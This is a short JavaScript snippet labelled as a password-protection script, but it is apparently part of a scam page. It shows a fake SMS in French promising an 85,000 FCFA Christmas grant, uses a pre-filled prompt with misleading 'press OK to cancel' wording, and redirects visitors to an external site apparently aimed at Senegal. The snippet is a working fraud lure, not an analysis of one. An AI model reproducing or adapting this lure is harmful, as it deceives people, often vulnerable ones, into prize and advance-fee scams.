  
/* Password Protection Script by www.onlineofferz.xyz*/
var password = 'RETIRER 85 000 CFA'
password = prompt(
  'SMS: Félicitations ! Vous êtes admissible à la bourse de Noël de 85 000 FCFA. Veuillez appuyer sur OK pour annuler votre demande..',
  'RETIRER 85 000 CFA'
);
if (password != 'RETIRER 85 000 CFA') {
  location.href = 'https://rhward.org/senegal.html';
}
